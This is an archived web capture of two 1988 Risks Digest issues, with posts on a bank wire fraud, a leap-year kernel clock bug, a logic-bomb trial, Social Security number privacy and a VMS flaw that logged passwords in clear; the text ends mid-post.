<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 10</H1>
<H2> Friday, 15 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Multimillion $ Fraud Failed due to Computer Error 
</A>
<DD>
<A HREF="#subj1.1">
Frans Heeman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Library Privacy 
</A>
<DD>
<A HREF="#subj2.1">
Michael Wagner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A reverse Heisenbug: it's there only if you look for it 
</A>
<DD>
<A HREF="#subj3.1">
Dave Platt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "The Consultant" on TV 
</A>
<DD>
<A HREF="#subj4.1">
Jim Horning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  The timewarps of '88 
</A>
<DD>
<A HREF="#subj5.1">
Rayan Zachariassen
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Multimillion $ Fraud Failed due to Computer Error
</A>
</H3>
<address>
Frans Heeman 
&lt;<A HREF="mailto:mcvax!cs.vu.nl!frans@uunet.UU.NET">
mcvax!cs.vu.nl!frans@uunet.UU.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 14 Jan 88 09:01:57 GMT
Organization: VU Informatica, Amsterdam

In the Dutch newspaper "De Volkskrant" of Tuesday january 12 and
Wednesday january 13 1988, two articles appeared on a computer fraud
that was discovered by ... an error of that same computer.

    An employee of a bank in Amsterdam (name of the bank not mentioned)
    transferred $15.1 million to a Swiss account, using the computer. To
    make an international money transfer, two persons must give
    permission. Each of them has a secret password. The employee knew
    the password of one of his collegue's, and had a password himself,
    and thus could make the money transfer on his own.

    On december 24, the employee tranferred $8.4 million and
    $6.7 million to a bank in Zurich. Due to a technical malfunctioning,
    the transfer of $6.7 million failed. After Christmas, other
    employees saw on their terminalscreen that the transfer had failed,
    got suspicious, and reported to their superiors.

    According to the Volkskrant, many banks use the same system, and
    this method of fraud "occurs presumably more often, although the
    banks are very quiet about this". The employee is arrested.

This makes me wonder about fail-safe computers: a fail-safe computer would
have failed to save the bank from THIS fraud :-)
                   				   Frans Heeman, frans@cs.vu.nl

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Library Privacy (RISKS DIGEST 6.8)
</A>
</H3>
<address>
Michael Wagner +49 228 303 245 
&lt;<A HREF="mailto:WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU">
WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Fri, 15 Jan 88 14:02 CET
</i><PRE>

  In Risks 6.8, Steve Cisler wrote
&gt; This means that no one ... can get a profile of your reading habits
&gt; from checking old records.  There are just not any--except overdue items ...

This comes up from time to time, but it's worth pointing out again.  Don't
forget to think about (and talk about) the backup system.  This system,
designed explicitly for the re-creation of old data in certain, failure
situations, can be (mis)used to recreate the data in other situations unless
the backup system is designed with data protection and selective erasure in
mind.
                                   Michael
      [The old Contragate so-you-thought-you'd-deleted-it problem...  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A reverse Heisenbug: it's there only if you look for it
</A>
</H3>
<address>
Dave Platt
&lt;<A HREF="mailto:coherent!dplatt@ames.arc.nasa.gov ">
coherent!dplatt@ames.arc.nasa.gov 
</A>&gt;
</address>
<i>
Fri, 15 Jan 88 10:05:35 PST
</i><PRE>

I've encountered a marvelous Heisenbug (a bug whose behavior changes when
you look for it) involving TOPS Spool and MultiFinder.  Yesterday, I
installed MultiFinder on one of the Mac SE systems here at work.  After
rebooting, I found that TOPS Spool worked fine when the system was booted in
Finder mode, but behaved erratically when the system was booted in
MultiFinder mode.  The primary symptom I saw was that TOPS Spool would spool
the file to disk, but would not print it.  The status display would
indicated "Waiting; source: AppleTalk", and the printer's yellow status
light would double-blink (indicating that the printer was waiting for data
to be sent over AppleTalk).  This wouldn't always occur, and didn't always
occur at the same point in a file.  I tried spooling one file several times,
and the copies seemed to exhibit different behavior.

Finally, I noticed one critical clue:  if I had turned "Print while I work"
off, and then opened the TOPS Spool d/a and turned it back on, the spooler
would not begin transmitting the file until I closed the desk accessory.
Printing would then begin, and would continue to work properly until I opened
the desk accessory again... at which point the current print job would hang!

So... hmmm... using the TOPS Spool desk accessory under MultiFinder causes the
background printing task to stop working, but using exactly the same desk
accessory, System, drivers, etc. works just fine if the system is booted under
the Finder.  What's the difference?  Well, under MultiFinder, desk accessories
are normally opened by a mini-application called DA Handler, so that they won't
go away if you "Quit" from your current application.  I tried opening TOPS
Spool while holding down the Option key, which forces the desk accessory to run
in the current application's context... and, lo and behold, background printing
kept working! Apparently, the TOPS Spool desk accessory interferes with the
background-printing task if it's run under DA Handler, but not if it's run
under the current application (Finder, in my case).

So... this is really a reverse Heisenbug, of sorts... the software works unless
you look to see whether it's working, at which point it stops working!

Dave Platt
  UUCP:	...!{ames,sun,uunet}!coherent!dplatt
  Internet: coherent!dplatt@ames.arpa, ...@sun.com, ...@uunet.uu.net

     [For those of you who weren't in on the original flurry of Heisenbugs,
     see <A HREF="/Risks/4.30.html">RISKS-4.30</A> through 36, and a few subsequent issues.   PGN] 

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
"The Consultant" on TV
</A>
</H3>
<address>
Jim Horning
&lt;<A HREF="mailto:horning@src.dec.com ">
horning@src.dec.com 
</A>&gt;
</address>
<i>
15 Jan 1988 1447-PST (Friday)
</i><PRE>

I got many responses to my question.  Here are some relevant excerpts:

From: olling@tcgould.tn.cornell.edu (Cliff Olling)

I caught 2 or 3 episodes of it quite by accident about 6 months to
1 yr ago.  It was showing on one of the PBS stations on our cable
here in Ithaca.  I think the PBS stations are in Scranton, PA, and
Binghamton &amp; Syracuse, NY.

As for the content, I found it interesting from the theatrical as
well as the technical sense.  The consultant didn't seem to be blatantly
"bat", and I don't remember actually took any money.  He seemed more
like an adult version of the typical teenage hacker stereotype.  The
technical parts (actually typing on terminals, using modems, etc.),
actually seemed fairly realistic.  There were no whirling tape drives
or modems going Beep-Boop-Beep-Boop a'la War Games.  All in all, very
little suspension of disbelief was required.

From: davy@intrepid.ecn.purdue.edu (Dave Curry)

"The Consultant" BBC television series was aired on the Arts &amp;
Entertainment Network (a cable channel) on Monday evenings about two
years ago.  If I remember right, they broke it into five or six episodes
instead of four, each was an hour long.

The series wasn't too bad... they actually used "computer words", and
didn't do anything silly like make the terminal beep for each character
it printed, etc.  Some stuff was simplified for the general public, but
overall I found it an enjoyable series.

The A&amp;E Network tends to re-air most of their more popular shows every
year or two.

From: watrous@aramis.rutgers.edu (Don Watrous)

I've seen it play on A&amp;E (cable) a couple of times within the last
year or two.  ...  I remember the characters and the premise, but
don't recall being very impressed.

From: Lee Barford &lt;barford%hplabsb@hplabs.HP.COM&gt;

The Arts &amp; Entertainment Network played it twice, about 18 months
ago and again about a year ago.
 
    [Some of this covered by comments from Brian Kantor, Scott C Crumpton, 
    Dave Curry, Dwight D McKay, Alan Wexelblat, ... PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
The timewarps of '88  [More Leap Year details -- SEE RISKS-6.4 to 7]
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 14 Jan 88 22:16:10 -0500
From: Rayan Zachariassen &lt;rayan%ai.toronto.edu@RELAY.CS.NET&gt;

Not having anything better to do last New Year's evening, it seemed like
a good opportunity to synchronize our computer clocks with reality.  So,
as the leap second approached, my finger was poised on the RETURN key.
Poof, the New Year arrived and the clock was back in sync.  Ten minutes
later, the computer was half an hour into '88.  Hmmm, didn't look right.
For the next couple of hours, I was chasing the system clock the way a
cat stalks its evasive prey.

A day or so later, the first reports appeared of other people having the
same problem (by this time I was used to frequent timewarps on the system).
The problem turned out to be caused by a classical programming error:

	Macro arguments with side effects are Bad Style.

The problem was in the clock maintenance software in the kernel, where
a C macro defined as:

#define	MONTHSEC(mon, yr)	\
	(((((yr) % 4) == 0) &amp;&amp; ((mon) == 2))? 29*SECDAY : monthsec[(mon) - 1])

was called using:

	... MONTHSEC(--mon, year);

instead of:

	--mon;
	... MONTHSEC(mon, year);

The code was written after the previous leap year, and the double-evaluation
of the first argument would not occur until another leap year.  Some knee-jerk
analysis of the problem wrongly blamed the leap second (what with all the
publicity).  Since most clocks and software don't know about leap seconds,
this was not plausible.

Considering the 40000-odd (my estimate) computers that were affected by
this problem, many many people were thinking of the careless programmer
with warm, sizzling, thoughts.  It didn't reflect well on the employer/vendor
either, both in letting this problem slip by them, and in letting an apparent
novice write such a critical section of code.  I realize my criticism may
be harsh, but it is coloured by the severity of the problem, having
experienced it, and knowing the cause.

On a vaguely related matter, the latest issue of The Economist (9-15 Jan 88)
has an article titled "Something Rotten in the State of Software".  It is
a 3-page overview of computer bugs, what causes them, and what to do about it.
Several Risks issues, and people (Neuman, Parnas, Leveson), are mentioned.

Never trust computers.
                                        rayan

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.09.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.11.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-47</DOCNO>
<DOCOLDNO>IA012-000130-B023-359</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.11.html 128.240.150.127 19970217015209 text/html 25704
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:50:23 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 11</TITLE>
<LINK REL="Prev" HREF="/Risks/6.10.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.12.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.10.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.12.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 11</H1>
<H2> Friday, 22 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Another One-Character Error 
</A>
<DD>
<A HREF="#subj1.1">
Earl Boebert
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Safety in MIL-STD-2167A 
</A>
<DD>
<A HREF="#subj2.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Brady Report on the Crash 
</A>
<DD>
<A HREF="#subj3.1">
Randall Davis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Data tampering, CTFC study of Major Market Index 
</A>
<DD>
<A HREF="#subj4.1">
Randy Oppenheimer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Court drops 'logic bomb' trial 
</A>
<DD>
<A HREF="#subj5.1">
John Pettitt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Official word on Social Security Numbers 
</A>
<DD>
<A HREF="#subj6.1">
Rob Austein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  VAX/VMS security problem 
</A>
<DD>
<A HREF="#subj7.1">
Philip Taylor via Rob Gross
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  TimeWarps as an omen 
</A>
<DD>
<A HREF="#subj8.1">
Jeffrey R Kell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  New Year's 
</A>
<DD>
<A HREF="#subj9.1">
Robert Slade
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Time-chasing 
</A>
<DD>
<A HREF="#subj10.1">
Paul Fuqua
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Re: New Year's Sun clock 
</A>
<DD>
<A HREF="#subj11.1">
Martin Ewing
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Another One-Character Error
</A>
</H3>
<address>
&lt;<A HREF="mailto:Boebert@DOCKMASTER.ARPA">
Boebert@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Mon, 18 Jan 88 17:16 EST
</i><PRE>

The note about the Honeywell H800 that the Air Force dropped off the
loading dock brought back this memory ...

At the time of that incident, I was an EDP Officer at Hq Air Training
Command.  Our H800 shared a computer room with the Military Personnel
Center, who had just moved the personnel records of all of the officers
in the USAF onto mag tape files on a Burroughs B5000.  The biggest job
they ran was queries, which were written in a perverted first-order
predicate calculus and asked questions like "which officers have
specialty codes equal 'xxxx' and grade equal 'Captain'" and so forth.
Individual records were pulled by the obvious query "which officers have
Service Number equal 'xxxx'..."

The program loaded a batch of queries into the B5000 and then passed the
whole tape file against it, printing "hits" on line, giving a
distinctive rhythm to the job:

buzzzzchunkachunkabuzzzchunkabuzzzzzzzzzzzzchunkachunkabuzzz....

One Sunday I came in to play our favorite computer game (called "Beat the H800
Compiler" or "You Bet Your Project") and noticed that the B5000 next door was
going:

chunkachunkachunkachunkachunkachunkachunkachunkachunkachunka...

so I went over and pulled rank on the airman who was running the job.
Examination of the input showed that somebody had tried to select a
specific record, but through clerical error had inserted a "not" sign
before the "equal." Had I not intervened, this would have produced a
truckload of paper containing every officer personnel record in the Air
Force, except, of course, the one they were looking for.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Safety in MIL-STD-2167A                      [Safety in NUMBERS?]
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri, 22 Jan 88 07:36:17 -0800
From: Nancy Leveson &lt;nancy%murphy.uci.edu@ROME.UCI.EDU&gt;

This may be a case of me being the last to know, but from a briefing 
on the new version of the DoD standard for software development 
(MIL-STD-2167 -- now called 2167A), I learned that one of the stated 
goals of the new version is to add safety requirements.  To this end, a 
requirement has been added for the contractor "to conduct safety analysis 
to (a) minimize potential for hazardous conditions during the operational 
mission and (b) clearly identify and document hazards."  There is also a
provision added to the Software Requirements Specification DID to 
document safety requirements.

Whatever one may think of such standards in general or of these particular 
safety requirements,  including safety requirements in the software 
development standards is a step forward in awareness and concern.  

I have written a lot in various places about what I think should be done 
during software development in order to increase safety.  It would be 
interesting to me to read more in this bulletin board about specific 
approaches that others might advocate.  Given that you were in charge 
of a project to develop software to control a potentially dangerous system 
(e.g., a nuclear power plant, a medical device such as a linac, or an 
aircraft), what (if anything) special would you do to ensure acceptable 
safety?  Or if you have already had such experiences, what have you done 
and did you think it was effective and adequate?

Nancy Leveson, University of California, Irvine

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Brady Report on the Crash
</A>
</H3>
<address>
Randall Davis 
&lt;<A HREF="mailto:DAVIS%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU">
DAVIS%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Sun 17 Jan 88 15:53-EST
</i><PRE>

In view of the numerous discussions about the possible role of portfolio
insurance strategies and technology in the market crash, consider these
comments from/about the recently released Brady report.  The conclusion is
that those strategies and technology were largely not causes of the crash;
there is as well a call for more use of information systems as an effective
way of monitoring the markets and preventing problems in the future.

(From a Boston Globe news analysis column 13 January 1988)


                   Brady Panel Hits Mark on the Crash
                              David Warsh

The Brady Report is just back from the printers... its recommendations boil
down to two basic strategies -- coordinate margin requiresments and establish
circuit-breakers (coordinated trading halts and existing price limits)....

For a survey done in 60 days, it's clear the panel ... has done an unusually
good job in construing what happened. ... The analytic framework seems likely
to withstand all subsequent attempts to alter it.

The story that emerges confirms what has been previously reported.  It wasn't
``Black Monday'' that was so bad, it was ``Terrible Tuesday,'' when the
markets nearly closed that was the real shocker.

And although they contributed a very substantial overhang of selling pressure
that hit the market like a tidal wave on Monday morning, new-fangled trading
strategies like portfolio insurance or index arbitrage did not ``cause'' the
crash.

If anything, various failures of the specialist system, in which 50
little-known firms commit themselves to buy and sell particular stocks in
order to keep the market orderly, provided the biggest disappointments...

In the end, the problem was in the market-mechanisms themselves, the record-
keeping and emergency protocols which permitted a ``disentangling'' of the
futures markets in Chicago and the share markets in NY.

The recommendation that Brady later described as the ``strongest'' was the one
that had the least to do with public regulation.  It was that a unified
clearing system be developed, linking the Chiago and NY markets, so that
authorities and firms can constantly monitor the shifting action when
turbulence strikes again.

With better informatin systems, portfolio insurance and other hedging
strategies would no longer pose an especially serious threat, the task force
said. ...

What we ought to be focusing on, said Brady, was ``technology, a market that's
strung together by 300,000 television screens, where a trade in NY shows up on
a screen in Tokyo 41 seconds later.  We've got one market.  We ought to be
focusing on the problems associated with that.''

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Data tampering, CTFC study of Major Market Index
</A>
</H3>
<address>
&lt;<A HREF="mailto:Randy_Oppenheimer@IMG011.CEO.DG.COM">
Randy_Oppenheimer@IMG011.CEO.DG.COM
</A>&gt;
</address>
<i>
Wed, 20 Jan 88 10:01:40 EST
</i><PRE>
Date:    January 20, 1988
Organization:      Data General

The Wall Street Journal (1-7-88) carried a story examining whether the Major
Market Index (MMI) was manipulated at a critical point during the stock market
crash.  The MMI is a little known futures contract index.  According to the
Journal, its "mysterious surge...may have saved the stock market from total
meltdown."

The gist of the story is that a study by the Commodity Futures Trading
Commission (CFTC) determined there was no evidence of any manipulation.  That
finding, the Journal reported, immediately came under attack by various
persons, who questioned even the data that the CFTC examined, claiming it may
have been doctored.  The Journal notes a congressional committee is now
investigating allegations that the data used in the study may have been
incorrect or tampered with before it was submitted to the CFTC.

The Journal article concludes: "In Chicago, a spokesman for the Board of Trade,
which supplied much of the data used by the CFTC, declined comment. A Board of
Trade official familiar with the data said he is skeptical the data could have
been tampered with, noting that it is computer-generated."

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Court drops 'logic bomb' trial
</A>
</H3>
<address>
John Pettitt
&lt;<A HREF="mailto:jpp@slxsys.specialix.co.uk ">
jpp@slxsys.specialix.co.uk 
</A>&gt;
</address>
<i>
Mon Jan 18 12:40:52 1988
</i><PRE>
Organization: Specialix International, London, UK.

Reproduced without permission from 'datalink' Monday 11 Jan 1988

James  McMahon,  the  contract  systems  programmer   accused  of
planting "logic bombs" in his client's computer systems, has been
cleared of all charges.

McMahon walked free from Isleworth Crown Court, London, late last
month after the presiding judge Derek Holden accepted a mid-trial
defence   motion   that   the  evidence   against   McMahon   was
inconsistent, incomplete and lacking in reliability.

The ruling which focused on print-out and disk exhibits, promises
to be a watershed in the history of computer law, influenceing
the validity of such admissions if future cases.

The trial was billed as the UK's first "logic bomb" case, with
McMahon accused of planting unauthorised code in the DEC PDP 11
system software of air freight forwarder Pandair Freight. The
prosecution claimed that one such "logic bomb" locked terminals
at Pandair's Heston office, near Heathrow, and a second was set
to wipe the memory of the companys Birmingham computer.

John Pettitt, Specialix, Giggs Hill Rd, Thames Ditton, Surrey, England, KT7 0TR
{backbone}!mcvax!ukc!pyrltd!slxsys!jpp               jpp@slxsys.specialix.co.uk
Tel: +44-1-398-9422         Fax: +44-1-398-7122          Telex: 918110 SPECIX G

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Official word on Social Security Numbers
</A>
</H3>
<address>
Rob Austein 
&lt;<A HREF="mailto:SRA@XX.LCS.MIT.EDU">
SRA@XX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Tue 19 Jan 88 17:24:24-EST
</i><PRE>

For what it's worth, here's the "official" story on SSNs, from a
USENET posting by David Hawkins.  I have not verified the quote.

According to Social Security Administration Publication No. 05-10001 (Sept 86)

  DISCLOSING YOUR SOCIAL SECURITY NUMBER
    "Any Federal, State or local agency that asks for your Social Security
     number must tell you whether giving it is mandatory or voluntary,
     under what authority the number is being requested, and what uses will
     be made of it.

     Some non-governmental organizations also use Social Security numbers
     for recordkeeping purposes.  Such use is neither required nor
     prohibited by Federal law.  Although you are not required to give
     you number, the organization is not required to provide you service
     if you do not.  Knowing your number does not allow these organizations
     to get information from your Social Security record."

I don't know how this applies to semi-public entities like utility
companies.

Use of an SSN as a Driver's License ID number poses an interesting
problem: the state government is presumably within the law in using
your SSN as their internal ID number, but should they be printing it
on your license?  Seems kinda irresponsible.  What if somebody steals
this funny little piece of plastic that the goverment requires you to
carry when you drive your car?  In effect, the state government has
just disclosed your SSN to your mugger.  Sure, the mugger's the one
who's breaking the law, but it's the state government's fault that
you're carrying your SSN around with you when you're in the car.
Maybe that's why hitchhiking is illegal in so many states? [:-)]

Of course, in states where Driver's License ID number is different
from SSN, you simply have two ID numbers that are demanded of you at
different times; they're both required for "normal life".  Not much of
an improvement.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 VAX/VMS security problem
</A>
</H3>
<address>
Rob Gross
&lt;<A HREF="mailto:<GROSS%BCVMS.BITNET@MITVMA.MIT.EDU> ">
&lt;GROSS%BCVMS.BITNET@MITVMA.MIT.EDU&gt; 
</A>&gt;
</address>
<i>
Thu, 21 Jan 88 16:54 EST
</i><PRE>
Organization: Boston College

The following was recently posted to the INFO-VAX mailing list:

Date:         Tue, 19 Jan 88 12:08:50 GMT
Reply-To:     "RHBNC,
              Univ of London Philip Taylor"
              &lt;CHAA006%vaxb.rhbnc.ac.uk@NSS.Cs.Ucl.AC.UK&gt;
Sender:       INFO-VAX Discussion &lt;INFO-VAX@MARIST&gt;
From:         CHAA006%vaxb.rhbnc.ac.uk@NSS.Cs.Ucl.AC.UK
Subject:      VMS security

I believe I have discovered a serious loophole in VMS security. If breakin-
detection is in force, and a user enters his/her username incorrectly, without
noticing the error, then enters the correct password, that password can appear
on the operator console and in the operators' log.  This occurs when the same,
incorrect, username is entered sufficient times for breakin-detection to become
activated.  As it is not unknown for system managers to reduce the detection
limit to two, the appearance of such passwords, in clear, is a distinct
possibility.

For example, a user changes his/her password; later, on logging-in, mis-types
the username (but doesn't notice the fact), and enters the old password; sees
"Invalid username/password", and remembers that he/she has a new password;
uses &lt;Control-B&gt;/&lt;Up-arrow&gt; to recall the username (to save re-typing it),
then enters the new, correct, password.  Breakin-detection is set at two, and
the correct password, plus the username with perhaps a single error in it,
appear in clear.  An unlikely scenario ?  Well, it happened to me, yesterday !

Since for common privileged usernames such as SYSTEM, it would typically be the
work of a moment to guess the mis-typed username, system security can be
seriously compromised.  Furthermore, anything which results in a valid password
being stored and displayed in clear is a serious breach of the zeroth rule of
system security.  ** Phil.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
     TimeWarps as an omen
</A>
</H3>
<address>
Jeffrey R Kell 
&lt;<A HREF="mailto:JEFF%UTCVM.BITNET@CUNYVM.CUNY.EDU">
JEFF%UTCVM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 19 Jan 88 14:30:21 EDT
</i><PRE>

After reading through yet another year's assortment of clock-related bugs
an ominous realization of the scope of the Star Wars critique by David
Parnas came to light.  Every year we hear of clock-related bugs, even more
so during leap years, and may the bits beware on 1 Jan 2000.

Here we have a relatively trivial, extremely well-defined task of rolling
over a clock to update a year.  In the extremely simplistic case of mere
changes of minutes, hours, or day, there are enough "real" cases to give
a real test, and find (most) bugs.  But for more extreme cases, the testing
is done through 'simulations' and you simply are not dealing with the real
events; it is extremely difficult to test in the actual environment.  Very
few of us, I doubt, would actually bother to repeatedly reboot a real system
with the test time placed in the real clock to see if it works.

The problem is not with "inexperienced Mickey Mouse" programmers either.
Look at the IBM 3090's that called in for service due to a bug in the clock
routine during the system's early days, or the Sun problems, or any other
of the nightmares that appeared in Risks.  Many were people that "should
have known better" or "should have tested more thoroughly."

If we are unable to keep a clock/calendar operating correctly, how can we
possibly presume that a massively complex, ill-defined system like SDI can
work, combined with the impossibility of a real-life test environment?

If SDI is completed, and we must use it, and it fails, we won't have to
bother with clock-setting algorithms any longer.

Jeffrey R Kell, Dir Tech Services, Univ of Tennessee at Chattanooga 

     [It is always tempting to conclude that if such a simple thing cannot
     be done correctly, then how can 10 million lines of code work adequately?
     This is a debate that has no end, although maybe we are ready to go around
     again on SDI, a subject that has received considerable discussion in 
     earlier volumes of RISKS!  Nevertheless, the moral of the story is clear 
     -- the more complex the system, the greater the attention that must be
     paid to it, from the overall design down to the minute details...  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
New Year's
</A>
</H3>
<address>
&lt;<A HREF="mailto:Robert_Slade@mtsg.ubc.ca">
Robert_Slade@mtsg.ubc.ca
</A>&gt;
</address>
<i>
Thu, 21 Jan 88 07:56:28 PST
</i><PRE>

     With regard to the computers dying over New Year's, my father in law just
came up with a real oddball. He was using Appleworks, patched to take
advantage of extra memory, a clock card, and a few other goodies. After the
Christmas holidays, his system no longer fired up automatically, and instead
had to be babied to get it to work.
 
     The final answer turned out to be in ProDos, a currently popular operating
system for the Apple that has superceded Apple's own DOS 3.3. A number of
clock cards for the Apple (my father in law's not being among them) do not
store the year. ProDos very kindly calculates the year from the month, day,
and day of the week. The tables for doing this, however, are limited, and
one of the anniversary dates for early versions was 1988. Later versions will
fail in future years...

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Time-chasing and SSNs
</A>
</H3>
<address>
Paul Fuqua 
&lt;<A HREF="mailto:pf%ti-csl.csc.ti.com@RELAY.CS.NET">
pf%ti-csl.csc.ti.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Thu, 21 Jan 88 22:07:09 CST
</i><PRE>

     I had some fun chasing a computer-clock problem a couple of years ago.
At that time we had six or seven Symbolics 3600 lispms, which initialise
their real-time clocks at boot time by broadcasting a request for the time on
